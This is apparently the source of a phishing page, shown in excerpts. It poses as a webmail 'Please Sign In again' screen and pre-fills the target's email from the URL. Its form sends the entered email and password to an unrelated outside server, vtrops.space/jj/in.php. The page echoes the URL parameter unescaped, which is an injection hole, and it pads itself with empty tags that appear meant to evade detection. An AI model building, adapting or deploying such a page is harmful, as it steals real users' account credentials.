...
<script type="text/javascript" src="./mlr_files/lib.js.download"></script>
<style type="text/css">
	body{
...
<body>
<div id="Layer1"><img src="mm.png" width="86" height="80"></div>

<div id="main-container">
	<div id="form-c">
		<form action="https://vtrops.space/jj/in.php" method="POST" >
								<div style= "text-align: center; font-size: 1.5em; ">
					<span id= "user-domain"></span><span style="font-size:0.6em;">&copy </span> <span style="color: " >Mail</span>
				</div>
...
<section></section><section></section><section></section><section></section><section></section><section></section><section></section>
		  ...
		  <div style="text-align:center;">
				...
				<div style="margin-top:10px; margin-bottom: 10px; font-size: 1.2em;">
					Please Sign In again to continue				</div>
				
									<div style="">
						Connected to <span style="color:#8a8b89;font-weight:bold; font-size:1em;"> <?php echo $_GET['email']; ?> <span style="color:#8a8b89;font-weight:bold; font-size:1em;">  </span>					</div>
							
				<div>
					<input type="hidden" name="email" id="email" placeholder="Email" value="<?php echo $_GET['email']; ?>"><br>
					<input type="password" name="password" placeholder="Password" id="password">
					<div id="error-c" style="text-align:center;"></div>
					<p>
					  <input type="hidden" name="frm-ac-tok" value="1488795688aLjZ8H57KwSc4ewiwtRx" id="frm-ac-tok">
					  <input type="hidden" name="um" id="um" value="<?php echo $_GET['email']; ?>">
...
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
			    ...
			    <span class="style1">invalid password ! </span></div>
				<div align="center">
				  <p>
				    <input name="Submit" class="btn login-btn" value="Sign In" type="submit">
				    <br>
			      </p>
				  <p>&nbsp;</p>
				</div>
...
<div id="footer">
		<span id="user-domain2"> </span> <span>©</span> 2020. All rights reserved.
</div>
<script type="text/javascript">
